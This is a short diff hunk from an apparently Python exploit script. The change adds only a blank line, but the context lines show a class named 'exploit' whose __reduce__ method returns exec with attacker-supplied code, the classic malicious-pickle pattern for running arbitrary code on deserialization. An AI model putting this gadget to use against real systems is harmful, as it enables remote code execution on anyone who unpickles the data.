@@ -27,6 +27,7 @@ class exploit:
     def __reduce__(self):
         return (exec, (self.code,))
 
+    
 def main():
     if len(argv) == 2:
         path = argv[1]
